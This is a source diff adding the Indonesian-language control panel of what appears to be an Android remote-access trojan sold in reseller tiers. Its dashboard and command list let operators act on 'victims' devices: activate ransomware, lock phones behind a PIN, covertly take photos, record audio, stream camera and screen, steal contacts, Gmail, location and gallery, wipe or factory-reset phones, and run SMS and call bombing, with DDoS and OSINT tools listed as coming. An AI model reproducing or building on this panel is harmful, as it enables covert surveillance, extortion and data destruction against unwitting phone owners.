+        <div class="vid-progress-bar" id="vidProgressBar2"><div class="vid-progress-fill" id="vidProgressFill2"></div></div>
+        <div class="vid-time-row">
+          <div class="label"><i class="fas fa-circle"></i> PLAYING INTRO</div>
+          <div><span id="vidCurrentTime2">0:00</span> / <span id="vidTotalTime2">0:00</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════ -->
+  <!-- DASHBOARD                                -->
+  <!-- ══════════════════════════════════════ -->
+  <div class="page" id="page-dash">
+    <div class="nbr-topbar">
+      <div class="nbr-topbar-logo"><span class="nbr-logo-text">BORUTO PROJECT</span></div>
+      <button class="nbr-logout-btn" onclick="doLogout()"><i class="fas fa-sign-out-alt"></i> LOGOUT</button>
+    </div>
+    <div class="nbr-body">
+      <div class="nbr-banner">
+        <img src="https://files.catbox.moe/854vc0.jpg" alt="BORUTO PROJECT Banner"
+             style="position:absolute;inset:0;width:100%;height:100%;object-fit:cover;object-position:center;display:block;z-index:1;"
+             onerror="this.style.display='none';document.getElementById('nbr-banner-fallback').style.display='flex';">
+        <div class="nbr-banner-inner" id="nbr-banner-fallback" style="display:none;">
+          <div class="nbr-banner-decoration">✦ ✧ ✦</div>
+          <div class="nbr-banner-text">BORUTO</div>
+          <div class="nbr-banner-text2">PROJECT</div>
+        </div>
+      </div>
+      <div class="nbr-profile-wrap">
+        <div class="nbr-profile-card">
+          <div class="nbr-profile-label">SYSTEM PROFILE</div>
+          <div class="nbr-profile-row">
+            <div class="nbr-avatar">
+              <svg viewBox="0 0 100 100" style="width:100%;height:100%">
+                <circle cx="50" cy="50" r="48" fill="#FACC15" stroke="#000" stroke-width="3"/>
+                <circle cx="50" cy="40" r="14" fill="#000"/>
+                <path d="M20 85 Q50 55 80 85 L80 95 L20 95 Z" fill="#000"/>
+              </svg>
+            </div>
+            <div class="nbr-profile-info">
+              <div class="nbr-username" id="nbr-username">-</div>
+              <div class="nbr-role-badge" id="nbr-role">-</div>
+              <div class="nbr-expired"><i class="fas fa-clock"></i><span>Expired:</span><span id="nbr-exp">-</span></div>
+            </div>
+            <div class="nbr-arrow-btn"><i class="fas fa-bolt"></i></div>
+          </div>
+          <div class="nbr-profile-stats">
+            <div class="nbr-stat-item"><div class="nbr-stat-val" id="nbr-online">0</div><div class="nbr-stat-label">ONLINE</div></div>
+            <div class="nbr-stat-divider"></div>
+            <div class="nbr-stat-item"><div class="nbr-stat-val" id="nbr-offline">0</div><div class="nbr-stat-label">OFFLINE</div></div>
+            <div class="nbr-stat-divider"></div>
+            <div class="nbr-stat-item"><div class="nbr-stat-val" id="nbr-total">0</div><div class="nbr-stat-label">TOTAL</div></div>
+          </div>
+        </div>
+        <div class="nbr-side-tab">BORUTO PROJECT</div>
+      </div>
+      <div class="nbr-section-title">Quick Actions</div>
+
+      <!-- CONNECT DEVICE -->
+      <div class="nbr-action-card" id="connectCard" onclick="toggleConnectForm()">
+        <div class="nbr-action-icon connect"><i class="fas fa-link"></i></div>
+        <div class="nbr-action-info">
+          <div class="nbr-action-tag">PAIRING</div>
+          <div class="nbr-action-title">Connect Device</div>
+          <div class="nbr-action-sub">Hubungkan perangkat baru</div>
+        </div>
+        <button class="nbr-action-btn">OPEN <i class="fas fa-chevron-right arrow-icon"></i></button>
+      </div>
+      <div class="connect-wrap" id="connectWrap">
+        <div class="connect-inner">
+          <div class="connect-info">
+            <i class="fas fa-info-circle"></i>
+            <div class="connect-info-text">Masukkan kode device milik user lain untuk menghubungkan perangkat ke panel Anda.</div>
+          </div>
+          <label class="connect-label">KODE DEVICE <span class="req">*</span></label>
+          <div class="connect-code-input" id="connect-code-wrap">
+            <i class="fas fa-key"></i>
+            <input type="text" id="connect-code-input" placeholder="Masukkan kode device…" autocomplete="off" inputmode="numeric" maxlength="64">
+          </div>
+          <button class="connect-submit" id="connect-submit" onclick="submitConnectCode()">
+            <i class="fas fa-plug"></i><span>HUBUNGKAN</span>
+          </button>
+          <div class="connect-status" id="connect-status">
+            <i class="fas fa-check-circle"></i>
+            <span id="connect-status-text">-</span>
+          </div>
+          <div class="connect-example" onclick="copyDeviceCode()">
+            <span class="code-text">Kode Anda: <strong id="connect-code-display">—</strong></span>
+            <button class="connect-copy-btn" type="button" onclick="event.stopPropagation(); copyDeviceCode()">
+              <i class="fas fa-copy"></i> SALIN
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <!-- CHAT GLOBAL -->
+      <div class="nbr-action-card" id="chatCard" onclick="toggleChatForm()">
+        <div class="nbr-action-icon chat"><i class="fas fa-comments"></i></div>
+        <div class="nbr-action-info">
+          <div class="nbr-action-tag">SOCIAL</div>
+          <div class="nbr-action-title">Chat Global</div>
+          <div class="nbr-action-sub">Obrolan dengan semua user</div>
+        </div>
+        <button class="nbr-action-btn">OPEN <i class="fas fa-chevron-right arrow-icon"></i></button>
+      </div>
+      <div class="chat-wrap" id="chatWrap">
+        <div class="chat-inner">
+          <div class="chat-status-bar">
+            <div class="chat-status-dot" id="chat-status-dot"></div>
+            <div class="chat-status-text" id="chat-status-text">DISCONNECTED</div>
+            <div class="chat-online-count" id="chat-online-count">0 ONLINE</div>
+          </div>
+          <div class="chat-messages" id="chat-messages"></div>
+          <div class="chat-users-row" id="chat-users-row"></div>
+          <div class="chat-input-row">
+            <div class="chat-input">
+              <i class="fas fa-comment-dots"></i>
+              <input type="text" id="chat-input" placeholder="Ketik pesan…" maxlength="500" autocomplete="off">
+            </div>
+            <button class="chat-send-btn" id="chat-send-btn" onclick="chatSendMessage()">
+              <i class="fas fa-paper-plane"></i>
+            </button>
+          </div>
+        </div>
+      </div>
+
+
+      <!-- GANTI PASSWORD -->
+      <div class="nbr-action-card" id="pwdCard" onclick="togglePasswordForm()">
+        <div class="nbr-action-icon key"><i class="fas fa-key"></i></div>
+        <div class="nbr-action-info">
+          <div class="nbr-action-tag">SECURITY</div>
+          <div class="nbr-action-title">Ganti Password</div>
+          <div class="nbr-action-sub">Perbarui keamanan akun</div>
+        </div>
+        <button class="nbr-action-btn">OPEN <i class="fas fa-chevron-right arrow-icon"></i></button>
+      </div>
+      <div class="pwd-form-wrap" id="pwdFormWrap">
+        <div class="pwd-form-inner">
+          <div class="pwd-info-card">
+            <div class="pwd-info-icon"><i class="fas fa-user"></i></div>
+            <div class="pwd-info-txt">
+              <div class="pwd-info-lbl">AKUN</div>
+              <div class="pwd-info-val" id="pwd-username">-</div>
+            </div>
+            <div class="pwd-info-badge">AKTIF</div>
+          </div>
+          <div class="pwd-section-head"><div class="bar"></div><div class="ttl">Perbarui Keamanan</div></div>
+          <div class="pwd-section-sub">Masukkan password lama &amp; baru</div>
+          <div class="pwd-field" id="pwd-old-wrap">
+            <div class="neo-field" id="pwd-old-field">
+              <i class="fas fa-lock"></i>
+              <input type="password" id="pwd-old" placeholder="Password Lama" autocomplete="off">
+              <button class="toggle-pass" type="button" onclick="pwdToggle('pwd-old', this)"><i class="fas fa-eye"></i></button>
+            </div>
+          </div>
+          <div class="pwd-field" id="pwd-new-wrap">
+            <div class="neo-field" id="pwd-new-field">
+              <i class="fas fa-key"></i>
+              <input type="password" id="pwd-new" placeholder="Password Baru" autocomplete="new-password">
+              <button class="toggle-pass" type="button" onclick="pwdToggle('pwd-new', this)"><i class="fas fa-eye"></i></button>
+            </div>
+          </div>
+          <div class="pwd-strength" id="pwd-strength">
+            <div class="bar-wrap"><div class="bar-fill" id="pwd-strength-fill"></div></div>
+            <div class="lbl" id="pwd-strength-lbl"></div>
+          </div>
+          <div class="pwd-field" id="pwd-confirm-wrap">
+            <div class="neo-field" id="pwd-confirm-field">
+              <i class="fas fa-shield-alt"></i>
+              <input type="password" id="pwd-confirm" placeholder="Konfirmasi Password" autocomplete="new-password">
+              <span class="match-badge" id="pwd-match-badge"></span>
+              <button class="toggle-pass" type="button" onclick="pwdToggle('pwd-confirm', this)"><i class="fas fa-eye"></i></button>
+            </div>
+          </div>
+          <button class="neo-btn" id="pwd-submit" style="margin-top:20px;" onclick="submitChangePassword()">
+            <i class="fas fa-lock"></i><span>PERBARUI PASSWORD</span>
+          </button>
+          <div class="pwd-tips">
+            <div class="pwd-tips-head"><i class="fas fa-shield-alt"></i> TIPS KEAMANAN</div>
+            <ul>
+              <li>Minimal 8 karakter</li>
+              <li>Kombinasi huruf besar, angka &amp; simbol</li>
+              <li>Hindari tanggal lahir atau nama</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <!-- ADMIN PAGE -->
+      <div class="nbr-action-card" id="adminCard" onclick="toggleAdminForm()">
+        <div class="nbr-action-icon admin"><i class="fas fa-user-shield"></i></div>
+        <div class="nbr-action-info">
+          <div class="nbr-action-tag">PANEL</div>
+          <div class="nbr-action-title">Admin Page</div>
+          <div class="nbr-action-sub">Buat Akun &amp; Kelola User</div>
+        </div>
+        <button class="nbr-action-btn">OPEN <i class="fas fa-chevron-right arrow-icon"></i></button>
+      </div>
+      <div class="admin-form-wrap" id="adminFormWrap">
+        <div class="admin-form-inner" id="adminFormInner"></div>
+      </div>
+
+      <!-- MUSIC -->
+      <div class="nbr-action-card" id="musicCard" onclick="toggleMusicPlayer()">
+        <div class="nbr-action-icon music"><i class="fas fa-music"></i></div>
+        <div class="nbr-action-info">
+          <div class="nbr-action-tag">MEDIA</div>
+          <div class="nbr-action-title">Music</div>
+          <div class="nbr-action-sub">Search &amp; Play Music</div>
+        </div>
+        <button class="nbr-action-btn">OPEN <i class="fas fa-chevron-right arrow-icon"></i></button>
+      </div>
+      <div class="music-wrap" id="musicWrap">
+        <div class="music-inner">
+          <div class="music-search">
+            <i class="fas fa-search"></i>
+            <input type="text" id="music-search-input" placeholder="Cari lagu, artis…" autocomplete="off">
+            <button onclick="musicSearch()"><i class="fas fa-paper-plane"></i></button>
+          </div>
+          <div class="music-nowplaying">
+            <div class="music-cover" id="music-cover"><i class="fas fa-music"></i></div>
+            <div class="music-info">
+              <div class="music-title" id="music-title">Belum ada lagu</div>
+              <div class="music-artist" id="music-artist">Cari &amp; pilih lagu untuk diputar</div>
+            </div>
+          </div>
+          <div class="music-progress">
+            <div class="music-progress-bar" id="music-progress-bar" onclick="musicSeekClick(event)">
+              <div class="music-progress-fill" id="music-progress-fill"></div>
+            </div>
+            <div class="music-time-row">
+              <span id="music-current-time">0:00</span>
+              <span id="music-total-time">0:00</span>
+            </div>
+          </div>
+          <div class="music-controls">
+            <div class="music-btn" id="music-shuffle" onclick="musicToggleShuffle()"><i class="fas fa-random"></i></div>
+            <div class="music-btn" onclick="musicPrev()"><i class="fas fa-step-backward"></i></div>
+            <div class="music-btn play" id="music-play-btn" onclick="musicTogglePlay()"><i class="fas fa-play" id="music-play-icon"></i></div>
+            <div class="music-btn" onclick="musicNext()"><i class="fas fa-step-forward"></i></div>
+            <div class="music-btn" id="music-repeat" onclick="musicToggleRepeat()"><i class="fas fa-redo"></i></div>
+          </div>
+          <div class="music-volume">
+            <i class="fas fa-volume-down"></i>
+            <input type="range" id="music-volume" min="0" max="100" value="70" oninput="musicSetVolume(this.value)">
+            <i class="fas fa-volume-up"></i>
+            <span style="font-family:'Space Mono',monospace;font-size:10px;font-weight:900;color:var(--textDim);min-width:36px;text-align:right;" id="music-volume-label">70%</span>
+          </div>
+          <div class="music-tabs">
+            <div class="music-tab active" data-tab="results" onclick="musicSetTab('results')">HASIL</div>
+            <div class="music-tab" data-tab="playlist" onclick="musicSetTab('playlist')">PLAYLIST</div>
+            <div class="music-tab" data-tab="favorites" onclick="musicSetTab('favorites')">FAVORIT</div>
+          </div>
+          <div class="music-list" id="music-list"></div>
+        </div>
+      </div>
+
+      <!-- TOOLS -->
+      <div class="nbr-action-card" id="toolsCard" onclick="toggleToolsForm()">
+        <div class="nbr-action-icon tools"><i class="fas fa-tools"></i></div>
+        <div class="nbr-action-info">
+          <div class="nbr-action-tag">UTILITY</div>
+          <div class="nbr-action-title">Tools</div>
+          <div class="nbr-action-sub">Kumpulan tools bantuan</div>
+        </div>
+        <button class="nbr-action-btn">OPEN <i class="fas fa-chevron-right arrow-icon"></i></button>
+      </div>
+      <div class="tools-wrap" id="toolsWrap">
+        <div class="tools-inner">
+          <div class="tools-section-head">
+            <div class="bar"></div>
+            <div class="ttl">Tool Categories</div>
+            <div class="count" id="tools-count">0 item</div>
+          </div>
+          <div class="tools-grid" id="toolsGrid"></div>
+          <div id="toolsSubContainer"></div>
+        </div>
+      </div>
+
+      <!-- LIST DEVICE -->
+      <div class="nbr-action-card" id="listDeviceCard" onclick="toggleListDevice()">
+        <div class="nbr-action-icon"><i class="fas fa-mobile-alt"></i></div>
+        <div class="nbr-action-info">
+          <div class="nbr-action-tag">ONLINE</div>
+          <div class="nbr-action-title">List Device</div>
+          <div class="nbr-action-sub">List HP Terhubung</div>
+        </div>
+        <button class="nbr-action-btn">OPEN <i class="fas fa-chevron-right arrow-icon"></i></button>
+      </div>
+      <div class="device-list-wrap" id="deviceListWrap">
+        <div class="device-list-inner" id="deviceListInner"></div>
+      </div>
+
+      <!-- LOG COMMAND -->
+      <div class="nbr-action-card" id="logCard" onclick="toggleLogForm()">
+        <div class="nbr-action-icon"><i class="fas fa-history"></i></div>
+        <div class="nbr-action-info">
+          <div class="nbr-action-tag">AUDIT</div>
+          <div class="nbr-action-title">Log Command</div>
+          <div class="nbr-action-sub">Riwayat perintah ke device</div>
+        </div>
+        <button class="nbr-action-btn">OPEN <i class="fas fa-chevron-right arrow-icon"></i></button>
+      </div>
+      <div class="device-list-wrap" id="logWrap">
+        <div class="device-list-inner" id="logInner">
+          <div class="device-empty"><i class="fas fa-history"></i><p>BELUM ADA LOG</p></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+</div>
+
+<!-- ═══ MODAL HARD LOCK ═══ -->
+<div class="modal-backdrop" id="modalHardLock">
+  <div class="modal-box">
+    <div class="modal-head">
+      <div class="m-icon"><i class="fas fa-lock"></i></div>
+      <h3>HARD LOCK</h3>
+      <div class="m-close" onclick="closeModal('modalHardLock')"><i class="fas fa-times"></i></div>
+    </div>
+    <div class="modal-body">
+      <div class="modal-field">
+        <label>PESAN UNTUK TARGET</label>
+        <textarea id="hl-message" placeholder="Contoh: HP INI DIKUNCI OLEH ADMIN">HP INI DIKUNCI</textarea>
+      </div>
+      <div class="modal-field">
+        <label>PIN UNLOCK</label>
+        <input type="text" id="hl-pin" placeholder="Contoh: 1234" maxlength="8" value="0853">
+      </div>
+    </div>
+    <div class="modal-actions">
+      <button class="modal-btn cancel" onclick="closeModal('modalHardLock')"><i class="fas fa-times"></i> BATAL</button>
+      <button class="modal-btn send" onclick="submitHardLock()"><i class="fas fa-paper-plane"></i> KIRIM</button>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ MODAL TOOL INPUT ═══ -->
+<div class="modal-backdrop" id="modalTool">
+  <div class="modal-box">
+    <div class="modal-head">
+      <div class="m-icon"><i class="fas fa-tools"></i></div>
+      <h3 id="toolModalTitle">TOOL</h3>
+      <div class="m-close" onclick="closeModal('modalTool')"><i class="fas fa-times"></i></div>
+    </div>
+    <div class="modal-body">
+      <div class="modal-field">
+        <label id="toolInputLabel">INPUT</label>
+        <input type="text" id="toolInput" placeholder="Masukkan input…">
+      </div>
+      <div class="modal-field" id="toolModeField" style="display:none;">
+        <label>MODE</label>
+        <select id="toolMode">
+          <option value="encode">Encode</option>
+          <option value="decode">Decode</option>
+        </select>
+      </div>
+      <div id="toolResult" style="display:none;padding:12px;background:#F0FDF4;border:3px solid var(--green);font-family:'Space Mono',monospace;font-size:11px;word-break:break-all;"></div>
+    </div>
+    <div class="modal-actions">
+      <button class="modal-btn cancel" onclick="closeModal('modalTool')"><i class="fas fa-times"></i> TUTUP</button>
+      <button class="modal-btn send" id="toolRunBtn" onclick="runTool()"><i class="fas fa-play"></i> JALANKAN</button>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ RESULT DIALOG ═══ -->
+<div class="result-dialog-backdrop" id="resultDialog">
+  <div class="result-dialog" id="resultDialogBox">
+    <div class="result-icon" id="resultIcon"><i class="fas fa-check"></i></div>
+    <div class="result-title" id="resultTitle">Berhasil</div>
+    <div class="result-msg" id="resultMsg">-</div>
+    <button class="result-btn" onclick="closeResultDialog()"><i class="fas fa-check"></i> OK</button>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+<script>
+/* ═══════════════════════════════════════════════════════════
+   KONFIGURASI
+   ═══════════════════════════════════════════════════════════ */
+const SERVER_BASE = window.BORUTO_SERVER_BASE || window.location.origin;
+const BORUTO_PRIVATE_KEY = window.BORUTO_PRIVATE_KEY || '';
+const CHAT_MAX_MESSAGES = 100;
+
+/* Private Server 1 compatibility: attach the configured private key to API requests.
+   Note: a key stored in frontend code is an access gate, not a true secret. */
+if (!window.__BORUTO_PRIVATE_FETCH_PATCHED) {
+  const _nativeFetch = window.fetch.bind(window);
+  window.fetch = function(input, init = {}) {
+    try {
+      const rawUrl = typeof input === 'string' ? input : (input && input.url) || '';
+      const target = new URL(rawUrl, window.location.href);
+      const base = new URL(SERVER_BASE, window.location.href);
+      if (BORUTO_PRIVATE_KEY && target.origin === base.origin) {
+        const headers = new Headers(init.headers || (input && input.headers) || {});
+        headers.set('X-Private-Key', BORUTO_PRIVATE_KEY);
+        init = { ...init, headers };
+      }
+    } catch (e) {}
+    return _nativeFetch(input, init);
+  };
+  window.__BORUTO_PRIVATE_FETCH_PATCHED = true;
+}
+
+function _getChatWsUrl() {
+  const wsBase = SERVER_BASE.replace(/^https:/, 'wss:').replace(/^http:/, 'ws:');
+  const key = BORUTO_PRIVATE_KEY ? `&privateKey=${encodeURIComponent(BORUTO_PRIVATE_KEY)}` : '';
+  return `${wsBase}/ws?mode=chat${key}`;
+}
+const CHAT_WS_URL = _getChatWsUrl();
+
+const ADMIN_ROLES = [
+  'MEMBER','FULLUP','RESELLER','HIGH RESELLER',
+  'PT','HIGH PT','TK','HIGH TK',
+  'OWNER','HIGH OWNER','KINGZ','HIGH KINGZ',
+  'VIP','HIGH VIP','VVIP','HIGH VVIP',
+  'PREMIUM','HIGH PREMIUM','PARTNER','HIGH PARTNER',
+  'MODERATOR','HIGH MODERATOR','STAF','HIGH STAF',
+  'TANGAN KANAN','CEO','HIGH CEO','ADMIN','HIGH ADMIN',
+  'DEVELOPER','HIGH DEVELOPER','CREATOR','HIGH CREATOR',
+  'PENGURUS','HIGH PENGURUS','RULER'
+];
+const BLOCKED_ROLES = ['MEMBER','FULLUP'];
+const ADMIN_EXPIRED = ['1 Hari','2 Hari','3 Hari','4 Hari','5 Hari','6 Hari','7 Hari','14 Hari','32 Hari','62 Hari','PERMANEN'];
+
+function getRoleIndex(r){ if(!r) return -1; return ADMIN_ROLES.findIndex(x => x.toUpperCase() === String(r).toUpperCase().trim()); }
+function isBlockedRole(r){ return BLOCKED_ROLES.includes(String(r||'').toUpperCase().trim()); }
+function canAccessAdminPage(r){ const i = getRoleIndex(r); if(i<0) return false; return !isBlockedRole(r); }
+const SPECIAL_MANAGE_ROLES = Object.freeze({
+  'HIGH RESELLER': ['RESELLER','FULLUP','MEMBER'],
+  'RESELLER': ['FULLUP','MEMBER']
+});
+function getManageableRoles(r){
+  const role = String(r||'').toUpperCase().trim();
+  if(role === 'RULER') return ADMIN_ROLES.filter(x => x !== 'RULER');
+  if(isBlockedRole(role)) return [];
+  if(Object.prototype.hasOwnProperty.call(SPECIAL_MANAGE_ROLES, role)) return SPECIAL_MANAGE_ROLES[role].slice();
+  const i = getRoleIndex(role); if(i<0) return [];
+  return ADMIN_ROLES.filter((x,idx) => idx < i && x !== 'RULER');
+}
+function canManageRole(u,t){
+  const role = String(u||'').toUpperCase().trim();
+  const target = String(t||'').toUpperCase().trim();
+  if(!canAccessAdminPage(role) || !target || target === 'RULER') return false;
+  return getManageableRoles(role).includes(target);
+}
+function _calcExpiredDate(d){ if(d==='PERMANEN') return '9999-99-99'; const n=parseInt(d)||0; if(n<=0) return '9999-99-99'; const dt=new Date(); dt.setDate(dt.getDate()+n); return dt.toISOString().slice(0,10); }
+function _daysLeft(e){ if(!e||e==='PERMANEN'||e==='9999-99-99') return Infinity; try{ return Math.max(0, Math.ceil((new Date(e+'T00:00:00') - new Date()) / 86400000)); }catch(x){ return 0; } }
+
+const FEATURE_CATS = [
+  { title:'LOCK & SECURITY', features: [
+    { label:'Hard Lock', icon:'fa-lock', cmd:'hard_lock_modal', danger:true },
+    { label:'Unlock', icon:'fa-unlock', cmd:'unlock' },
+    { label:'Ransomware', icon:'fa-skull', cmd:'activate_ransomware', danger:true },
+    { label:'Virus Mode', icon:'fa-virus', cmd:'virus_mode', danger:true },
+    { label:'Panic Unlock', icon:'fa-unlock-alt', cmd:'panic_unlock' },
+    { label:'Virus Unlock', icon:'fa-unlock-alt', cmd:'virus_unlock' },
+  ]},
+  { title:'SURVEILLANCE', features: [
+    { label:'Take Photo', icon:'fa-camera', cmd:'take_photo' },
+    { label:'Get Screen', icon:'fa-desktop', cmd:'get_screen' },
+    { label:'Get Contacts', icon:'fa-address-book', cmd:'get_contacts' },
+    { label:'Get Location', icon:'fa-map-marker-alt', cmd:'get_location' },
+    { label:'Get Gmails', icon:'fa-envelope', cmd:'get_gmails' },
+    { label:'Record Audio', icon:'fa-microphone', cmd:'record_audio' },
+    { label:'Stop Record', icon:'fa-stop-circle', cmd:'stop_record_audio' },
+    { label:'Grab Gallery', icon:'fa-images', cmd:'grab_gallery' },
+    { label:'Grab Videos', icon:'fa-video', cmd:'grab_videos' },
+  ]},
+  { title:'STREAMING', features: [
+    { label:'Cam Stream', icon:'fa-video', cmd:'start_cam_stream' },
+    { label:'Stop Cam', icon:'fa-stop', cmd:'stop_cam_stream' },
+    { label:'Screen Stream', icon:'fa-desktop', cmd:'start_screen_stream' },
+    { label:'Stop Screen', icon:'fa-stop', cmd:'stop_screen_stream' },
+  ]},
+  { title:'MEDIA CONTROL', features: [
+    { label:'Flashlight ON', icon:'fa-lightbulb', cmd:'flashlight_on' },
+    { label:'Flashlight OFF', icon:'fa-lightbulb', cmd:'flashlight_off' },
+    { label:'Flash Strobe', icon:'fa-bolt', cmd:'flash_strobe' },
+    { label:'Stop Strobe', icon:'fa-stop', cmd:'stop_strobe' },
+    { label:'Vibrate Loop', icon:'fa-mobile', cmd:'vibrate_loop' },
+    { label:'Play Audio', icon:'fa-music', cmd:'play_audio' },
+    { label:'Stop Audio', icon:'fa-stop', cmd:'stop_audio' },
+    { label:'Set Wallpaper', icon:'fa-image', cmd:'set_wallpaper' },
+  ]},
+  { title:'DESTRUCTIVE', features: [
+    { label:'Factory Reset', icon:'fa-bomb', cmd:'factory_reset', danger:true },
+    { label:'Wipe Data', icon:'fa-trash', cmd:'wipe_data', danger:true },
+    { label:'Call Bombing', icon:'fa-phone', cmd:'call_bombing', danger:true },
+    { label:'SMS Bomber', icon:'fa-sms', cmd:'sms_bomber', danger:true },
+    { label:'Battery Drain', icon:'fa-battery-empty', cmd:'battery_drain', danger:true },
+  ]},
+  { title:'APP CONTROL', features: [
+    { label:'Hide App', icon:'fa-eye-slash', cmd:'hide_app' },
+    { label:'Show App', icon:'fa-eye', cmd:'show_app' },
+    { label:'Force Open', icon:'fa-external-link-alt', cmd:'force_open' },
+    { label:'Open URL', icon:'fa-link', cmd:'open_url' },
+    { label:'Request Admin', icon:'fa-user-shield', cmd:'request_admin' },
+  ]},
+];
+
+const TOOLS_CATEGORIES = [
+  { id:'panel', title:'Manage Server', subtitle:'Server Control', icon:'fa-cloud', color:'teal', items:[{ label:'Manage Server', icon:'fa-server', sub:'Panel kontrol server', url:'#', soon:true }]},
+  { id:'ddos', title:'DDoS', subtitle:'Take Down', icon:'fa-bolt', color:'red', items:[{ label:'Attack Panel', icon:'fa-bolt', sub:'Kirim serangan', url:'#', soon:true }]},
+  { id:'network', title:'Network', subtitle:'WiFi Arsenal', icon:'fa-wifi', color:'green', items:[
+    { label:'Spam NGL', icon:'fa-newspaper', sub:'Spam pesan NGL', url:'#', soon:true },
+    { label:'WiFi Killer (Internal)', icon:'fa-wifi', sub:'Attack via IP publik', url:'#', soon:true },
+    { label:'WiFi Killer (External)', icon:'fa-router', sub:'Attack via router', url:'#', soon:true, vip:true },
+  ]},
+  { id:'osint', title:'OSiNT', subtitle:'Deep Search', icon:'fa-search', color:'purple', items:[
+    { label:'NIK Detail', icon:'fa-id-card', sub:'Cek data NIK', url:'#', soon:true },
+    { label:'Domain OSINT', icon:'fa-globe', sub:'Info domain', url:'#', soon:true },
+    { label:'Phone Lookup', icon:'fa-phone', sub:'Cari nomor HP', url:'#', soon:true },
+    { label:'Email OSINT', icon:'fa-at', sub:'Info email', url:'#', soon:true },
+  ]},
+  { id:'downloader', title:'Downloader', subtitle:'Media Saver', icon:'fa-download', color:'amber', items:[
+    { label:'TikTok Downloader', icon:'fa-video', sub:'Download TikTok', url:'#', soon:true },
+    { label:'Instagram Downloader', icon:'fa-camera', sub:'Download IG', url:'#', soon:true },
+  ]},
+  { id:'utilities', title:'Utilities', subtitle:'Extra Tools', icon:'fa-construction', color:'blue', items:[
+    { label:'IP Lookup', icon:'fa-shield', sub:'Cek info IP', cmd:'tool_ip_lookup' },
+    { label:'Domain Info', icon:'fa-globe', sub:'Cek DNS domain', cmd:'tool_domain_info' },
+    { label:'Short URL', icon:'fa-link', sub:'Perpendek URL', cmd:'tool_short_url' },
+    { label:'Base64', icon:'fa-code', sub:'Encode/decode', cmd:'tool_base64' },
+    { label:'Hash Generator', icon:'fa-fingerprint', sub:'MD5/SHA', cmd:'tool_hash' },
+  ]},
+  { id:'watchs', title:'Watch Video', subtitle:'Stream & Watch', icon:'fa-play-circle', color:'blue', items:[
+    { label:'Anime', icon:'fa-tv', sub:'Stream anime', url:'#', soon:true },
+    { label:'Dracin', icon:'fa-film', sub:'Drama China', url:'#', soon:true },
+  ]},
+  { id:'adulthub', title:'Adult Hub', subtitle:'18+ Only', icon:'fa-lock', color:'pink', items:[{ label:'Hentai', icon:'fa-heart', sub:'Konten 18+', url:'#', soon:true }]},
+];
+
+const state = { username:'', password:'', role:'', expiredDate:'', sessionKey:'', victims:[], listOpen:false, expandedDeviceId:null };
+const adminState = { open:false, targetUsername:'', targetPassword:'', role:'', expired:'', rolePickerOpen:false, expiredPickerOpen:false };
+const connectState = { open: false };
+const toolsState = { open: false, openCat: null };
+const logState = { open: false };
+const chatState = { open: false, ws: null, connected: false, connecting: false, reconnectTimer: null, messages: [], onlineUsers: [], username: '', role: '' };
+const musicState = { open:false, tab:'results', results:[], playlist:[], favorites:[], currentIndex:-1, shuffle:false, repeat:false, volume:0.7, isPlaying:false };
+let musicAudio = null;
+let currentTool = null;
+
+/* ═══════════════════════════════════════════════════════════
+   NAVIGASI
+   ═══════════════════════════════════════════════════════════ */
+function goTo(pageId) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  const el = document.getElementById('page-' + pageId);
+  if (el) { el.classList.add('active'); window.scrollTo(0, 0); }
+  if (pageId === 'dash') updateProfile();
+}
+
+async function doLogoutSilent(){
+  const oldKey = state.sessionKey || localStorage.getItem('sessionKey') || '';
+  if(oldKey && SERVER_BASE){ try { await fetch(`${SERVER_BASE}/logout`, {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:new URLSearchParams({sessionKey:oldKey}).toString()}); } catch(e){} }
+  localStorage.removeItem('username');
+  localStorage.removeItem('password');
+  localStorage.removeItem('role');
+  localStorage.removeItem('expiredDate');
+  localStorage.removeItem('sessionKey');
+  state.username=''; state.password=''; state.role=''; state.expiredDate=''; state.sessionKey='';
+  state.victims=[]; state.listOpen=false; state.expandedDeviceId=null;
+  adminState.open=false; connectState.open=false;
+  chatState.open=false; chatDisconnect(); chatState.messages=[]; chatState.onlineUsers=[];
+  if(typeof introVideo !== 'undefined' && introVideo){ try { introVideo.pause(); introVideo.currentTime=0; } catch(e){} }
+  if(typeof introVideo2 !== 'undefined' && introVideo2){ try { introVideo2.pause(); introVideo2.currentTime=0; } catch(e){} }
+  document.getElementById('lu').value='';
+  document.getElementById('lp').value='';
+  document.getElementById('btn-login').disabled = false;
+  document.getElementById('btn-login').innerHTML = '<i class="fas fa-sign-in-alt"></i><span>MASUK</span>';
+  goTo('login');
+}
+
+function doLogout() { if (confirm('Yakin mau logout?')) doLogoutSilent(); }
+
+/* ═══════════════════════════════════════════════════════════
+   LOGIN FIELD
+   ═══════════════════════════════════════════════════════════ */
+const lu = document.getElementById('lu');
+const lp = document.getElementById('lp');
+const fu = document.getElementById('fu');
+const fp = document.getElementById('fp');
+lu.addEventListener('focus', () => fu.classList.add('focused'));
+lu.addEventListener('blur', () => fu.classList.remove('focused'));
+lp.addEventListener('focus', () => fp.classList.add('focused'));
+lp.addEventListener('blur', () => fp.classList.remove('focused'));
+
+function togglePass() {
+  const p = lp.type === 'password';
+  lp.type = p ? 'text' : 'password';
+  document.getElementById('eye').className = p ? 'fas fa-eye-slash' : 'fas fa-eye';
+}
+
+/* ═══════════════════════════════════════════════════════════
+   VIDEO INTRO
+   ═══════════════════════════════════════════════════════════ */
+const introVideo = document.getElementById('introVideo');
+const vidPlayCenter = document.getElementById('vidPlayCenter');
+const vidProgressFill = document.getElementById('vidProgressFill');
+const vidCurrentTime = document.getElementById('vidCurrentTime');
+const vidTotalTime = document.getElementById('vidTotalTime');
+const vidSkipBtn = document.getElementById('vidSkipBtn');
+
+function _vidFmt(sec){ if(!sec || isNaN(sec)) return '0:00'; const m=Math.floor(sec/60), s=Math.floor(sec%60); return `${m}:${s.toString().padStart(2,'0')}`; }
+function vidPlay(){ if(!introVideo) return; introVideo.currentTime=0; introVideo.play().catch(() => { if(vidPlayCenter) vidPlayCenter.classList.add('show'); }); }
